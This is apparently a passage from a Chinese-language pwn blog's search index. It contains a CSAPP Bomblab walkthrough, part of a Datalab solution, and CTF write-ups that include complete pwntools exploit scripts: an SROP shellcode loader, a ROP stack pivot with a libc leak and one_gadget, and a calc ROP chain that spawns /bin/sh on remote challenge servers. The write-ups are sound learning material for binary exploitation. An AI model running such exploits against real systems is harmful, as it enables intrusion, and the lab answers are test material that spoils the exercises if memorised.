401188 \u003cphase_6+0x94\u003e ;0x401188 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab \u003cphase_6+0xb7\u003e ;0x4011ab 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 \u003cphase_6+0x8f\u003e ;0x401183 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 \u003cphase_6+0x82\u003e ;0x401176 esi赋值为0，rsp+rsi指向的值，即我们的数组元素，放入ecx，并与1进行比较。小于等于1则跳转回去，将0x6032d0处的内容放入rsp+rsi*2+0x20的位置。否则，eax赋值为1，0x6032d0放入edx，跳转到，0x6032d0+8放入rdx，eax+1并于当前数组值进行比较，不相等就eax++，0x6032d0+8再加8。直到与当前数组元素相等，将偏移后的地址指向的内容放入rsp+rsi*2+0x20。然后索引值rsi+4并与0x18比较，判断是否到了数组尾部。否则将下一个元素放入ecx，并与1比较。 这里不太清晰我们看一下0x6032d0有什么： pwndbg\u003e x/24x 0x6032d0 0x6032d0 \u003cnode1\u003e: 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 \u003cnode2\u003e: 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 \u003cnode3\u003e: 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 \u003cnode4\u003e: 0x000002b3 0x00000004 0x00603310 0x00000000 0x603310 \u003cnode5\u003e: 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 \u003cnode6\u003e: 0x000001bb 0x00000006 0x00000000 0x00000000 可以发现这是一个链表，每个节点的结构如下： struct node{ int value; int index; node *next; } 我们刚刚做的就是将节点地址放入了栈中。 继续分析下一段： 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 \u003cphase_6+0xde\u003e ;0x4011d2 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd \u003cphase_6+0xc9\u003e ;0x4011bd 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 rbx分别指向数组首址，rax指向第二个节点，rsi指向","date":"2021-01-31","objectID":"/csapp-bomblab/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_6"},{"categories":["Pwning"],"content":"secret_phase这里还有一个彩蛋！先来找一下进入条件： 00000000004015c4 \u003cphase_defused\u003e: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u003cnum_input_strings\u003e 4015df: 75 5e jne 40163f \u003cphase_defused+0x7b\u003e 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 \u003cphase_defused+0x71\u003e 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 \u003cstrings_not_equal\u003e 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 \u003cphase_defused+0x71\u003e 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 \u003cputs@plt\u003e 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 \u003cputs@plt\u003e 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 \u003csecret_phase\u003e 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 \u003cputs@plt\u003e 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 \u003cphase_defused+0x90\u003e 40164f: e8 dc f4 ff ff callq 400b30 \u003c__stack_chk_fail@plt\u003e 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq 要想进入必须满足，0x603759 处的值为6，调试发现，我们每闯过一关，这里的值都会+1。所以必须通过前六关才可以。然后传入了，五个参数。我们看看$0x402619和0x603870处是什么： pwndbg\u003e x /2s 0x402619 0x402619: \"%d %d %s\" 0x402622: \"DrEvil\" pwndbg\u003e x 0x603870 0x603870 \u003cinput_strings+240\u003e: \"7 0\" 是我们第四关的答案，所以第二个条件就是在第四关中，之后又调用了strings_not_equal将我们输入的第三个参数与DrEvil进行比较，如果相等就可以进入。所以，为了进入我们要在第四关答案基础上添加 DrEvil，别忘了空格。 0000000000401242 \u003csecret_phase\u003e: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e \u003cread_line\u003e 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 \u003cstrtol@plt\u003e 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c \u003csecret_phase+0x2a\u003e 401267: e8 ce 01 00 00 callq 40143a \u003cexplode_bomb\u003e 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 \u003cfun7\u003e 在secret_phase中，首先会调用一个strtol函数将输入的内容转换成10进制数，说明我们的输入要是一个数字。然后将返回值与999进行比较，如果大于999就会爆炸。然后将输入的数字作为第二个参数，0x6030f0作为第一个参数调用fun7。 查看0x6030f0： pwndbg\u003e x /120w 0x6030f0 0x6030f0 \u003cn1\u003e: 0x00000024 0x00000000 0x00603110 0x00000000 0x603100 \u003cn1+16\u003e: 0x00603130 0x00000000 0x00000000 0x00000000 0x603110 \u003cn21\u003e: 0x00000008 0x00000000 0x00603190 0x00000000 0x603120 \u003cn21+16\u003e: 0x00603150 0x00000000 0x00000000 0x00000000 0x603130 \u003cn22\u003e: 0x00000032 0x00000000 0x00603170 0x00000000 0x603140 \u003cn22+16\u003e: 0x006031b0 0x00000000 0x00000000 0x00000000 0x603150 \u003cn32\u003e: 0x00000016 0x00000000 0x00603270 0x00000000 0x603160 \u003cn32+16\u003e: 0x00603230 0x00000000 0x00000000 0x00000000 0x603170 \u003cn33\u003e: 0x0000002d 0x00000000 0x006031d0 0x00000000 0x603180 \u003cn33+16\u003e: 0x00603290 0x00000000 0x00000000 0x00000000 0x603190 \u003cn31\u003e: 0x00000006 0x00000000 0x006031f0 0x00000000 0x6031a0 \u003cn31+16\u003e: 0x00603250 0x00000000 0x00000000 0x00000000 0x6031b0 \u003cn34\u003e: 0x0000006b 0x00000000 0x00603210 0x00000000 0x6031c0 \u003cn34+16\u003e: 0x006032b0 0x00000000 0x00000000 0x00000000 0x6031d0 \u003cn45\u003e: 0x00000028 0x00000000 0x00000000 0x00000000 0x6031e0 \u003cn45+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x6031f0 \u003cn41\u003e: 0x00000001 0x00000000 0x00000000 0x00000000 0x603200 \u003cn41+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603210 \u003cn47\u003e: 0x00000063 0x00000000 0x00000000 0x00000000 0x603220 \u003cn47+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603230 \u003cn44\u003e: 0x00000023 0x00000000 0x00000000 0x00000000 0x603240 \u003cn44+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603250 \u003cn42\u003e: 0x00000007 0x00000000 0x00000","date":"2021-01-31","objectID":"/csapp-bomblab/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#secret_phase"},{"categories":["Writeups"],"content":"Challenges_100-Week_4 Challenges Tricks 0x41414141 CTF-moving-signals SROP 0x41414141 CTF-external stack pivoting pwnable.tw-calc 逻辑漏洞+ROP ","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#challenges_100-week_4"},{"categories":["Writeups"],"content":"moving-signals","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#moving-signals"},{"categories":["Writeups"],"content":"ida mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 1F4h syscall ; LINUX - sys_read retn endp pop rax retn 见过最短的程序了….简单分析发现只能控制rax，即sycall调用的函数。为了能控制更多的寄存器，想到使用SROP。 ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./moving-signals' #gdb.attach(p) if local: p=process(binary) else: p=remote('161.97.176.150',2525) elf = ELF(binary,checksec=False) start=0x041000 pop_rax=0x041018 syscall=0x041015 bss=0x041500 shellcode=asm(shellcraft.sh()) #gdb.attach(p) frame = SigreturnFrame() frame.rsp=bss frame.rip=syscall frame.rax=constants.SYS_read frame.rdi=0 frame.rsi=bss frame.rdx=0x50 payload='a'*8+p64(pop_rax)+p64(0xf)+p64(syscall)+str(frame) p.send(payload) payload=p64(bss+8)+shellcode p.sendline(payload) p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp"},{"categories":["Writeups"],"content":"external","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#external"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { char buf[80]; // [rsp+0h] [rbp-50h] BYREF puts(\"ROP me ;)\"); printf(\"\u003e \"); read(0, buf, 0xF0uLL); clear_got(); return 0; } 主函数把got表给清除了，着实吓到我了。不过有个系统调用。 .text:000000000040127C write_syscall proc near ; CODE XREF: timeout+22↑p .text:000000000040127C ; __unwind { .text:000000000040127C mov rax, 1 .text:0000000000401283 syscall 主函数的汇编代码如下： .text:0000000000401224 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:0000000000401224 public main .text:0000000000401224 main proc near ; DATA XREF: _start+21↑o .text:0000000000401224 .text:0000000000401224 buf = byte ptr -50h .text:0000000000401224 .text:0000000000401224 ; __unwind { .text:0000000000401224 push rbp .text:0000000000401225 mov rbp, rsp .text:0000000000401228 sub rsp, 50h .text:000000000040122C lea rdi, s ; \"ROP me ;)\" .text:0000000000401233 call _puts .text:0000000000401238 lea rdi, format ; \"\u003e \" .text:000000000040123F mov eax, 0 .text:0000000000401244 call _printf .text:0000000000401249 lea rax, [rbp+buf] .text:000000000040124D mov edx, 0F0h ; nbytes .text:0000000000401252 mov rsi, rax ; buf .text:0000000000401255 mov edi, 0 ; fd .text:000000000040125A call _read .text:000000000040125F mov eax, 0 .text:0000000000401264 call clear_got .text:0000000000401269 mov eax, 0 .text:000000000040126E leave .text:000000000040126F retn .text:000000000040126F ; } // starts at 401224 .text:000000000040126F main endp 虽然没有了got表，但是我们可以通过bss段的stdin进行leak。要做的操作有： 控制write参数将stdin地址leak 控制read参数读取one_gadget地址并将其写入到已知地址 控制程序执行流，到one_gadget 通过write进行leak后，如果想要再次控制rax那么就会进行leave ret，进行了栈迁移。这是我们无法控制的，并且我们没有在fake stack中布置栈结构。所以我们先进行read，提前布置好栈的结构。然后调用write进行leak。之后因为还要接受one_gadget的地址，并将其写入可控地址，同时我们要进行栈的迁移。所以回到0x40125f的位置正好帮助我们完成了这个操作。 那么布置的栈结构是什么样的呢？当程序执行到fake stack中时，已经完成了，leak与栈迁移，rax也被置为0，这时我们只要调用read，并将one_gadget写到read返回之后即可。 ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./external' #gdb.attach(p) if local: p=process(binary) else: p=remote('161.97.176.150',9999) elf = ELF(binary,checksec=False) offset = 0x50 write_call=0x040127C pop_rdi=0x4012f3 pop_rsi=0x4012f1 stdin=0x0404070 fake_stack=0x404078+0x100 syscall=0x401283 leave_ret=0x04011d8 mov_eax=0x00401269 p.recv() payload='a'*offset+p64(fake_stack) payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack)+p64(0)+p64(syscall)#read(0,fake_stack,0x38) payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stdin)+p64(0)+p64(write_call)+p64(mov_eax)#write(1,stdin,0x38) p.send(payload) payload='a'*8+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack+56)+p64(0)+p64(syscall)#read(0,fake_stack+56,0x38) p.send(payload) sleep(1) stdin_addr= u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) print hex(stdin_addr) libc=ELF('./libc-2.28.so') libcbase=stdin_addr-libc.sym[\"_IO_2_1_stdin_\"] one=libcbase+0x448a3 #0x448a3 0xe5456 p.send(p64(one)) p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp-1"},{"categories":["Writeups"],"content":"calc","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#calc"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwnable.tw/calc/calc' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#checksec"},{"categories":["Writeups"],"content":"idamain: int __cdecl main(int argc, const char **argv, const char **envp) { ssignal(14, timeout); alarm(60); puts(\"=== Welcome to SECPROG calculator ===\"); fflush(stdout); calc(); return puts(\"Merry Christmas!\"); } calc: unsigned int calc() { int v1[101]; // [esp+18h] [ebp-5A0h] BYREF char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF unsigned int v3; // [esp+5ACh] [ebp-Ch] v3 = __readgsdword(0x14u); while ( 1 ) { bzero(s, 0x400u); if ( !get_expr(s, 1024) ) break; init_pool(v1); if ( parse_expr((int)s, v1) ) { printf(\"%d\\n\", v1[v1[0]]); fflush(stdout); } } return __readgsdword(0x14u) ^ v3; } get_expr: int __cdecl get_expr(int a1, int a2) { int v2; // eax char v4; // [esp+1Bh] [ebp-Dh] BYREF int v5; // [esp+1Ch] [ebp-Ch] v5 = 0; while ( v5 \u003c a2 \u0026\u0026 read(0, \u0026v4, 1) != -1 \u0026\u0026 v4 != 10 ) { if ( v4 == 43 || v4 == 45 || v4 == 42 || v4 == 47 || v4 == 37 || v4 \u003e 47 \u0026\u0026 v4 \u003c= 57 ) { v2 = v5++; *(_BYTE *)(a1 + v2) = v4; } } *(_BYTE *)(v5 + a1) = 0; return v5; } parse_expr: int __cdecl parse_expr(int a1, _DWORD *num) { int v3; // eax int v4; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v6; // [esp+28h] [ebp-80h] int v7; // [esp+2Ch] [ebp-7Ch] char *s1; // [esp+30h] [ebp-78h] int left_num; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] BYREF unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v4 = a1; v6 = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) { if ( (unsigned int)(*(char *)(i + a1) - 48) \u003e 9 ) { v7 = i + a1 - v4; s1 = (char *)malloc(v7 + 1); memcpy(s1, v4, v7); s1[v7] = 0; if ( !strcmp(s1, \"0\") ) { puts(\"prevent division by zero\"); fflush(stdout); return 0; } left_num = atoi(s1); if ( left_num \u003e 0 ) { v3 = (*num)++; num[v3 + 1] = left_num; } if ( *(_BYTE *)(i + a1) \u0026\u0026 (unsigned int)(*(char *)(i + 1 + a1) - 48) \u003e 9 ) { puts(\"expression error!\"); fflush(stdout); return 0; } v4 = i + 1 + a1; if ( s[v6] ) // 判断当前操作符是否为第一个操作符 // 是则继续遍历寻找下一个操作符 // 否则对前面的式子进行计算 { switch ( *(_BYTE *)(i + a1) ) { case '%': case '*': case '/': if ( s[v6] != 43 \u0026\u0026 s[v6] != 45 ) goto LABEL_14; s[++v6] = *(_BYTE *)(i + a1); break; case '+': case '-': LABEL_14: eval(num, s[v6]); s[v6] = *(_BYTE *)(i + a1); break; default: eval(num, s[v6--]); break; } } else { s[v6] = *(_BYTE *)(i + a1); } if ( !*(_BYTE *)(i + a1) ) break; } } while ( v6 \u003e= 0 ) eval(num, s[v6--]); return 1; } eval: _DWORD *__cdecl eval(_DWORD *a1, char a2) { _DWORD *result; // eax if ( a2 == '+' ) { a1[*a1 - 1] += a1[*a1]; } else if ( a2 \u003e '+' ) { if ( a2 == '-' ) { a1[*a1 - 1] -= a1[*a1]; } else if ( a2 == '/' ) { a1[*a1 - 1] /= (int)a1[*a1]; } } else if ( a2 == '*' ) { a1[*a1 - 1] *= a1[*a1]; } result = a1; --*a1; return result; } get_expr用来获取输入的表达式，parse_expr用来进行处理式子。计算器大致的思路就是num数组只接受操作数，如果接收的操作符不是第一个操作符就进行计算。那么就有这样一个漏洞： 输入：+300 这时有一个操作数 *a1=1 *a2='+' num[1]=300 num[1-1]+=num[1] ===\u003e num[0]=301 最后--*a1 ===\u003e num[0]=300 那么v1[v1[0]] ===\u003e v1[300] 若输入：+300-100 +300的计算同上 num[0]-=num[1] ===\u003e num[300]=num[300]-100 实现了任意地址读写的,调试发现361处对应了返回地址 那么我们这样构造栈结构： 361===\u003e |pop_eax_addr | 362 |0xb | 363 |pop_edx_addr | 364 |0 | 365 |pop_ecx_ebx | 366 |0 | 367 |\u0026('/bin/sh') | 368 |int_0x80_addr | 369 |'/bin' | 370 |'/sh\\x00' | 计算栈的地址： .text:08049453 mov ebp, esp .text:08049455 and esp, 0FFFFFFF0h .text:08049458 sub esp, 10h main函数中，可知：main_stack_size=ebp\u00260xFFFFFFF0-0x10 则返回地址到ebp为main函数栈，长度为：index=main_stack_size/4+1 那么字符串的地址为：bin_sh=ebp-(index-8)*4，注意栈的增长方向。 ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./calc' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10100) elf = ELF(binary,checksec=False) ret_addr=0x08049499 pop_eax =0x0805c34b #361 362:11 pop_edx =0x080701aa #363 364:0 pop_ecx =0x080701d1 #365 366:0 367:\u0026(/bin/sh) int_0x80=0x08049a21 #368 369:'/bin/sh' gadget=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,0xffffffff,0x08049a21,0x6e69622f,0x0068732f] p.recv() for i in range(0,6): p.sendline('+'+str(361+i)) val=int(p.recv()) offset=int(gadget[i])-val if offset\u003e0: p.sendline('+'+str(361+i)+'+'+str(offset)) else: p.sendline('+'+str(361+i)+str(offset)) result=int(p.recv()) log.success(str(361+i)+'==\u003e'+hex(result)) p.sendline('+360') stackbase=int(p.recv()) stacksize=stackbase+0x100000000-((stackbase+0x100000000) \u0026 0xFFFFFFF0-16) bin_sh=stackbase+(8-(24/4+1))*4 p.sendline('+367') val_367=int(p.recv()) offset=bin_sh-val_367 if offset\u003e0: p.sendline('+'+str(367)+'+'+str(offset)) else: p.sendline('+'+str(367)+str(offset)) result=int(p.recv()) log.success(str(367)+'==\u003e'+hex(result)) for i in range(7,10): p.sendline('+'+str(361+i)) val=int(p.recv()) offset=int(gadget[i])-val if offset\u003e0: p.sendline('+'+str(361+i)+'+'+str(offset)) else: p.sendline('+'+str(361+i)+str(offset)) result=int(p.recv()) log.success(str(361+i)+'==\u003e'+hex(result)) #gdb.attach(p) p.sendline('Niebelungen') p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp-2"},{"categories":["Pwning"],"content":"CSAPP-Datalablabs系列的第一个lab，主要考查书中第二章的知识。挺烧脑的。。。 ","date":"2021-01-25","objectID":"/csapp-datalab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#csapp-datalab"},{"categories":["Pwning"],"content":"List Name Description Rating Max ops bitCor (x, y) x^y using only ~ and \u0026 1 14 tmin() 返回最小补码 1 4 isTmax(x) 判断是否为补码最大值 1 10 allOddBits(x) 判断补码所有奇数位是否都是1 2 12 negate(x) 不使用-实现-x 3 5 isAsciDigit(x) 判断x是否是ASCII码 3 15 conditional 实现x ? y : z 3 16 isLessOrEqual(x, y) x\u003c=y 3 24 logicalNeg(x)) 计算!x而不用! 3 12 howManyBits(x) 计算表达x所需的最少位数 4 90 float_twice(uf) 计算2.0*uf 4 30 float_i2f(uf) 计算(float) f 4 30 float_f2i(uf) 计算(int) f 4 30 ","date":"2021-01-25","objectID":"/csapp-datalab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#list"},{"categories":["Pwning"],"content":"bitCor (x, y) /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~x\u0026~y)\u0026~(x\u0026y); } 就像数电中的异或拆开一样。 ","date":"2021-01-25","objectID":"/csapp-datalab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#bitcor-x-y"},{"categories":["Pwning"],"content":"tmin() /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1\u003c\u003c31; } 最小的补码，正数位全为零，符号位为1。 ","date":"2021-01-25","objectID":"/csapp-datalab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#tmin"},{"categories":["Pwning"],"content":"isTmax(x) /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 2 */ int isTmax(int x) { int i=x+1; x+=i; x=~x;//get a zero only if x=0xfff..ff or 0x7ff..ff i=!i; x=x+i; return !x; } 7ffff...的一个特性，其+1后的结果与原数的和为ffffff...，而ffff...也有这个特性，所以通过这个性质可以过滤其他数，取反之后为0000000...。第二个性质，7ffff...+1之后不为0，而ffffff...+1后为0。通过这个性质来过滤ffffff... ","date":"2021-01-25","objectID":"/csapp-datalab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#istmaxx"},{"categories":["Pwning"],"content":"allOddBits(x) /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { int m=0xAA+(0xAA\u003c\u003c8); m=m+(m\u003c\u003c16); return !((m\u0026x)^m)); } 构造出奇数位全为1的数0xAAAAAAAA，与x相与取得其奇数位，再进行异或取反，相同为1，不同为0。 ","date":"2021-01-25","objectID":"/csapp-datalab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#alloddbitsx"},{"categories":["Pwning"],"content":"negate(x) /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { x=~x+1; return x; } ","date":"2021-01-25","objectID":"/csapp-datalab/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#negatex"},{"categories":["Pwning"],"content":"isAsciiDigit(x) /* * isAsciiDigit - return 1 if 0x30 \u003c= x \u003c= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int A=x+(~0x39+1);//x-0x39\u003c=0--\u003ex+~0x39+1\u003c=0--\u003e(x+~0x39+1)\u003e\u003e31 int B=!((x+(~0x30+1))\u003e\u003e31);//x-0x30\u003e=0--\u003ex+~0x30+1\u003e=0--\u003e!((x+~0x30+1)\u003e\u003e31) return B\u0026((!A)|(A\u003e\u003e31)); } ","date":"2021-01-25","objectID":"/csapp-datalab/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#isasciidigitx"},{"categories":["Pwning"],"content":"conditional(x , y, z) /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { x=!!x; x=~x+1; return (x\u0026y)|((~x)\u0026z); } 先将x转化为逻辑值。x为真时让x与y的运算等于y，x与z的运算为0.因为要保存数值，所以想到\u0026操作。因为我们要保存所有位，所以取其相反数。取z的情况正好相反。 ","date":"2021-01-25","objectID":"/csapp-datalab/:8:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#conditionalx--y-z"},{"categories":["Pwning"],"content":"isLessOrEqual(x, y) /* * isLessOrEqual - if x \u003c= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int A=(x\u003e\u003e31)\u00261; int B=(y\u003e\u003e31)\u00261; int C=A^B; int D=((y+(~x+1))\u003e\u003e31)\u00261; return (C\u0026A)|(!C\u0026!D); } 不同符号的数相减会出现溢出，所以分为两种情况 符号不同，x符号为1时，条件为真。 符号相同，进行y-x，当且仅当符号位为0时，条件为真。 ","date":"2021-01-25","objectID":"/csapp-datalab/:9:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#islessorequalx-y"},{"categories":["Pwning"],"content":"logicalNeg(x)) /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return (~(x|(~x+1))\u003e\u003e31)\u00261; } 0的相反数是其本身~ ","date":"2021-01-25","objectID":"/csapp-datalab/:10:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#logicalnegx"},{"categories":["Pwning"],"content":"howManyBits(x) /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { int b16,b8,b4,b2,b1,b0; int sign=x\u003e\u003e31; x = (sign\u0026~x)|(~sign\u0026x); b16 = !!(x\u003e\u003e16)\u003c\u003c4; x = x\u003e\u003eb16; b8 = !!(x\u003e\u003e8)\u003c\u003c3; x = x\u003e\u003eb8; b4 = !!(x\u003e\u003e4)\u003c\u003c2; x = x\u003e\u003eb4; b2 = !!(x\u003e\u003e2)\u003c\u003c1; x = x\u003e\u003eb2; b1 = !!(x\u003e\u003e1); x = x\u003e\u003eb1; b0 